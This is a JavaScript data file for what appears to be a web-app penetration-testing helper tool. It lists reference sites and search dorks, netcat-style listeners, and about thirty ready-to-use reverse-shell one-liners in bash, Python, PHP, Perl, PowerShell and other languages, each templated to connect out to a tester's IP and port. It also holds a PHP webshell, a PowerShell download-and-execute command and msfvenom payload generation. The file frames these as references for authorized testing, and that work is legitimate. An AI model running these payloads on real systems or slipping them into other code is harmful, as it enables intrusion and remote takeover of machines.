/* WARM — extra datasets: curated dork sites, reverse shells, listeners.
 * Reverse-shell commands template {tester_ip} / {tester_port} from the Scope panel.
 * These are standard, well-known offensive references for authorized testing only.
 */

/* Curated web-app pentest / security reference sites.
 * `dork` is the site: expression used in search; `url` is the direct link. */
// dork: must be a VALID search operator. site: takes a DOMAIN only (no path) — path-scoped
// refs use site:<domain> inurl:<path>. def: checked by default (keep this set small; Google/Bing
// degrade badly past ~6 ORed site: operators).
window.DORK_SITES = [
  { name: "HackTricks",            dork: "site:hacktricks.xyz",                               url: "https://book.hacktricks.xyz",                   def: true },
  { name: "HackTricks Cloud",      dork: "site:cloud.hacktricks.xyz",                         url: "https://cloud.hacktricks.xyz" },
  { name: "PayloadsAllTheThings",  dork: "site:swisskyrepo.github.io inurl:PayloadsAllTheThings", url: "https://swisskyrepo.github.io/PayloadsAllTheThings", def: true },
  { name: "InternalAllTheThings",  dork: "site:swisskyrepo.github.io inurl:InternalAllTheThings", url: "https://swisskyrepo.github.io/InternalAllTheThings" },
  { name: "PentestMonkey",         dork: "site:pentestmonkey.net",                            url: "https://pentestmonkey.net" },
  { name: "GTFOBins",              dork: "site:gtfobins.github.io",                           url: "https://gtfobins.github.io",                    def: true },
  { name: "LOLBAS",                dork: "site:lolbas-project.github.io",                     url: "https://lolbas-project.github.io" },
  { name: "WADComs",               dork: "site:wadcoms.github.io",                            url: "https://wadcoms.github.io" },
  { name: "OWASP Cheat Sheets",    dork: "site:cheatsheetseries.owasp.org",                   url: "https://cheatsheetseries.owasp.org",            def: true },
  { name: "OWASP WSTG",            dork: "site:owasp.org inurl:web-security-testing-guide",   url: "https://owasp.org/www-project-web-security-testing-guide/" },
  { name: "PortSwigger Academy",   dork: "site:portswigger.net inurl:web-security",           url: "https://portswigger.net/web-security",          def: true },
  { name: "ired.team",             dork: "site:ired.team",                                    url: "https://www.ired.team" },
  { name: "revshells.com",         dork: "site:revshells.com",                                url: "https://www.revshells.com" },
  { name: "Exploit-DB",            dork: "site:exploit-db.com",                               url: "https://www.exploit-db.com" }
];

window.DORK_ENGINES = [
  { name: "Google",     base: "https://www.google.com/search?q=" },
  { name: "DuckDuckGo", base: "https://duckduckgo.com/?q=" },
  { name: "Bing",       base: "https://www.bing.com/search?q=" },
  { name: "Startpage",  base: "https://www.startpage.com/sp/search?query=" }
];

window.LISTENERS = [
  { name: "netcat",       cmd: `nc -lvnp {tester_port}` },
  { name: "ncat",         cmd: `ncat -lvnp {tester_port}` },
  { name: "rlwrap nc",    cmd: `rlwrap -cAr nc -lvnp {tester_port}` },
  { name: "socat (TTY)",  cmd: 'socat file:`tty`,raw,echo=0 TCP-L:{tester_port}' },
  { name: "pwncat",       cmd: `pwncat-cs -lp {tester_port}` },
  { name: "ncat (TLS)",   cmd: `ncat --ssl -lvnp {tester_port}   # pair with the openssl / ncat-ssl reverse shell` },
  { name: "openssl (TLS)",cmd: `openssl req -x509 -newkey rsa:2048 -keyout /tmp/k.pem -out /tmp/c.pem -days 1 -nodes -subj '/CN=x' && openssl s_server -quiet -key /tmp/k.pem -cert /tmp/c.pem -port {tester_port}` }
];

/* TTY upgrade reminder shown on the Reverse Shells tab. */
window.TTY_UPGRADE = [
  `python3 -c 'import pty;pty.spawn("/bin/bash")'`,
  `# then: Ctrl-Z  ->  stty raw -echo; fg  ->  export TERM=xterm`
];

window.REVSHELLS = [
  { lang: "bash",       name: "bash -i",        cmd: `bash -i >& /dev/tcp/{tester_ip}/{tester_port} 0>&1` },
  { lang: "bash",       name: "bash 196",       cmd: `0<&196;exec 196<>/dev/tcp/{tester_ip}/{tester_port}; sh <&196 >&196 2>&196` },
  { lang: "bash",       name: "bash (read line)",cmd: `exec 5<>/dev/tcp/{tester_ip}/{tester_port};cat <&5 | while read line; do $line 2>&5 >&5; done` },
  { lang: "bash",       name: "bash UDP",       cmd: `sh -i >& /dev/udp/{tester_ip}/{tester_port} 0>&1` },
  { lang: "sh",         name: "sh mkfifo",      cmd: `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {tester_ip} {tester_port} >/tmp/f` },
  { lang: "netcat",     name: "nc -e",          cmd: `nc {tester_ip} {tester_port} -e /bin/sh` },
  { lang: "netcat",     name: "nc.traditional", cmd: `nc.traditional -e /bin/sh {tester_ip} {tester_port}` },
  { lang: "netcat",     name: "nc mkfifo (OpenBSD)", cmd: `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {tester_ip} {tester_port} >/tmp/f` },
  { lang: "python",     name: "python3 pty",    cmd: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{tester_ip}",{tester_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'` },
  { lang: "python",     name: "python3 short",  cmd: `export RHOST="{tester_ip}";export RPORT={tester_port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'` },
  { lang: "php",        name: "php exec",        cmd: `php -r '$sock=fsockopen("{tester_ip}",{tester_port});exec("/bin/sh -i <&3 >&3 2>&3");'` },
  { lang: "php",        name: "php system",      cmd: `php -r '$sock=fsockopen("{tester_ip}",{tester_port});system("/bin/sh -i <&3 >&3 2>&3");'` },
  { lang: "php",        name: "php webshell (cmd param)", cmd: `<?php passthru($_GET['cmd']); ?>   // drop as s.php, then: curl '{target_url}/s.php?cmd=id'  ·  SQLi-embedded (INTO OUTFILE / PG copy): double the quotes -> <?php passthru($_GET[''cmd'']); ?>` },
  { lang: "perl",       name: "perl",            cmd: `perl -e 'use Socket;$i="{tester_ip}";$p={tester_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },
  { lang: "ruby",       name: "ruby",            cmd: `ruby -rsocket -e'f=TCPSocket.open("{tester_ip}",{tester_port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
  { lang: "node",       name: "node.js",         cmd: `node -e 'sh=require("child_process").spawn("/bin/sh");net=require("net");c=new net.Socket();c.connect({tester_port},"{tester_ip}",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});'` },
  { lang: "powershell", name: "powershell #1",   cmd: `powershell -nop -W hidden -noni -c "$c=New-Object System.Net.Sockets.TCPClient('{tester_ip}',{tester_port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"` },
  { lang: "socat",      name: "socat",           cmd: `socat TCP:{tester_ip}:{tester_port} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane` },
  { lang: "lua",        name: "lua",             cmd: `lua -e "require('socket');require('os');t=socket.tcp();t:connect('{tester_ip}','{tester_port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"` },
  { lang: "telnet",     name: "telnet",          cmd: `TF=$(mktemp -u);mkfifo $TF && telnet {tester_ip} {tester_port} 0<$TF | /bin/sh 1>$TF` },
  { lang: "netcat",     name: "ncat -e",         cmd: `ncat {tester_ip} {tester_port} -e /bin/bash` },
  { lang: "netcat",     name: "ncat TLS",        cmd: `ncat --ssl {tester_ip} {tester_port} -e /bin/bash` },
  { lang: "sh",         name: "busybox nc",      cmd: `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|busybox sh -i 2>&1|busybox nc {tester_ip} {tester_port} >/tmp/f` },
  { lang: "bash",       name: "zsh",             cmd: `zsh -c 'zmodload zsh/net/tcp && ztcp {tester_ip} {tester_port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'` },
  { lang: "awk",        name: "awk",             cmd: `awk 'BEGIN{s="/inet/tcp/0/{tester_ip}/{tester_port}";while(1){do{printf "shell>" |& s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit")}}' /dev/null` },
  { lang: "openssl",    name: "openssl (TLS)",   cmd: `mkfifo /tmp/s;/bin/sh -i </tmp/s 2>&1|openssl s_client -quiet -connect {tester_ip}:{tester_port} >/tmp/s;rm /tmp/s` },
  { lang: "java",       name: "java Runtime",    cmd: `r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{tester_ip}/{tester_port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]);p.waitFor()` },
  { lang: "groovy",     name: "groovy",          cmd: `String host="{tester_ip}";int port={tester_port};String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();` },
  { lang: "powershell", name: "powershell b64",  cmd: `powershell -nop -w hidden -e <BASE64>   # generate: $c='<PS #1 oneliner>'; [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($c))` },
  { lang: "powershell", name: "powershell download-exec", cmd: `powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://{tester_ip}:{tester_port}/s.ps1')"   # Windows web RCE: host s.ps1 (a TCP revshell, e.g. powershell #1) and run this from the injection` }
];

/* Setup tab — tooling install commands (static, not templated). */
window.SETUP = [
  { group: "apt (Kali repo)", note: "apt skips anything already installed.", cmds: [
    { tool: "apt", cmd: "sudo apt update && sudo apt install -y jq seclists wordlists ffuf feroxbuster gobuster dirsearch nuclei subfinder amass dalfox arjun sqlmap wfuzz nikto whatweb commix testssl.sh dotdotpwn sslscan rlwrap socat pwncat pipx golang-go git" }
  ]},
  { group: "PATH (Go + pipx bins)", cmds: [
    { tool: "path", cmd: "echo 'export PATH=\"$PATH:$HOME/go/bin:$HOME/.local/bin\"' >> ~/.zshrc && source ~/.zshrc && pipx ensurepath" }
  ]},
  { group: "Go tools", note: "needs golang-go (in the apt line).", cmds: [
    { tool: "go", cmd: "for p in github.com/lc/gau/v2/cmd/gau github.com/hakluke/hakrawler github.com/projectdiscovery/katana/cmd/katana github.com/projectdiscovery/httpx/cmd/httpx github.com/projectdiscovery/interactsh/cmd/interactsh-client github.com/tomnomnom/waybackurls github.com/tomnomnom/gf github.com/tomnomnom/qsreplace github.com/tomnomnom/anew github.com/Emoe/kxss github.com/jaeles-project/gospider; do go install \"$p@latest\"; done" }
  ]},
  { group: "pipx (isolated Python CLIs)", cmds: [
    { tool: "pipx", cmd: "for p in git-dumper uro clairvoyance xsser name-that-hash; do pipx install \"$p\"; done" }
  ]},
  { group: "git tools -> /opt", note: "run e.g. python3 /opt/XSStrike/xsstrike.py", cmds: [
    { tool: "git", cmd: "sudo mkdir -p /opt && sudo chown $USER /opt; for r in s0md3v/XSStrike ticarpi/jwt_tool dolevf/graphw00f chenjj/CORScanner tarunkant/Gopherus synacktiv/php_filter_chain_generator swisskyrepo/PayloadsAllTheThings; do git clone -q https://github.com/$r /opt/$(basename $r); done" }
  ]},
  { group: "payload generators", note: "msfvenom (metasploit-framework) and ysoserial are allowed payload generators — not autopwn.", cmds: [
    { tool: "apt", cmd: "sudo apt install -y metasploit-framework    # provides msfvenom" },
    { tool: "ysoserial", cmd: "sudo mkdir -p /opt && wget -qO /opt/ysoserial.jar https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar   # java deser gadgets" },
    { tool: "phpggc", cmd: "git clone -q https://github.com/ambionics/phpggc /opt/phpggc && sudo ln -sf /opt/phpggc/phpggc /usr/local/bin/phpggc   # php deser gadget chains" },
    { tool: "ysoserial.net", cmd: "# .NET: grab a release from github.com/pwntester/ysoserial.net (run under mono/Windows) for BinaryFormatter/ViewState" },
    { tool: "msfvenom", cmd: "msfvenom -p php/reverse_php LHOST={tester_ip} LPORT={tester_port} -f raw -o shell.php   # or -p java/jsp_shell_reverse_tcp -f war -o s.war" }
  ]},
  { group: "WordPress / CMS", cmds: [
    { tool: "wpscan", cmd: "sudo apt install -y wpscan && wpscan --url {target_url} --enumerate u,ap,at --api-token <optional>" }
  ]},
  { group: "static binaries", cmds: [
    { tool: "trufflehog", cmd: "curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sudo sh -s -- -b /usr/local/bin" },
    { tool: "gitleaks", cmd: "curl -sSL https://github.com/gitleaks/gitleaks/releases/latest/download/gitleaks_8.18.4_linux_x64.tar.gz | tar xz -C /tmp gitleaks && sudo mv /tmp/gitleaks /usr/local/bin/" }
  ]}
];
